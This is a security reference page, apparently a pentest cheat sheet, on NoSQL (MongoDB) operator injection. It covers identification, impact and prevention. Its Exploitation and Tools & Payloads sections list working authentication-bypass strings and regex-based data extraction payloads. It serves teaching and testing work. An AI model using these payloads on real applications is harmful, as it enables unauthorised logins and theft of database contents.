# NoSQL Injection

## Overview

NoSQL databases (such as MongoDB) use query languages and data models that differ from traditional SQL. Injection vulnerabilities arise when user input is used unsafely in database queries, often through operators that can alter the intended logic of the query (e.g., `$ne`, `$gt`, `$regex`).

These can allow authentication bypass, data exfiltration, and other unauthorized operations without traditional SQL syntax.

## Attack Surface

- Login and authentication endpoints that use NoSQL backends
- Search, filter, and API parameters passed directly to database queries
- Applications using MongoDB, CouchDB, or similar with insufficient input handling

## Identification

- Test for operator injection by supplying JSON-like structures or URL-encoded equivalents.
- Look for differences in responses when using comparison or logical operators.
- Test authentication forms with operators that should return unexpected results (e.g., matching any document).
- Use regex or other evaluation operators to perform blind or in-band data extraction.

## Exploitation

### MongoDB Basics and Operators

Common comparison and logical operators:
- `$ne` : not equal
- `$gt`, `$gte`, `$lt`, `$lte` : greater/less than comparisons
- `$in`, `$nin` : in/not in arrays
- `$regex` : regular expression matching
- `$where` : JavaScript expression evaluation (powerful but dangerous)

Example queries:
```javascript
db.apples.find({
    $and: [
        { type: { $regex: /^G/ } },
        { price: { $lt: 0.70 } }
    ]
});
```

### Authentication Bypass

Common patterns (often sent as form data or JSON):
```
email[$ne]=test@test.com&password[$ne]=test
email[$regex]=.*&email[$regex]=.*
email=admin@example.com&password[$ne]=x
email[$gt]=&password[$gt]=
```

When email is known:
```
email=admin%40example.com&password[$ne]=x
```

### In-Band Data Extraction

Return entire collections or documents:
```
http://target/?q[$regex]=.*
http://target/?q[$ne]='doesntExist'
http://target/?q[$gt]=''
```

### Blind Data Extraction

Use `$regex` for character-by-character extraction by observing response differences:
```json
{
    "trackingNum": {
        "$regex": "^3.*"
    }
}
```

Continue refining the regex to extract data one character at a time.

## Impact

- Authentication bypass and account takeover
- Unauthorized data access or modification
- Full database exfiltration in some cases
- Potential for further compromise depending on application logic

## Prevention

- Use parameterized queries or safe query builders provided by the database driver/ORM.
- Never pass user input directly into query operators or use `$where` with user data.
- Implement strict input validation and whitelist expected fields and operators.
- Use database user accounts with minimal privileges.
- Sanitize or validate all input before constructing queries.
- Consider using an abstraction layer that prevents operator injection.

## Tools & Payloads

- Burp Repeater for testing operator injection manually
- Custom scripts or Intruder for blind regex extraction
- JSON structure testing in API requests

**Example MongoDB authentication bypass payloads (form or query string):**
- `email[$ne]=foo&password[$ne]=bar`
- `email=knownuser@example.com&password[$gt]=`
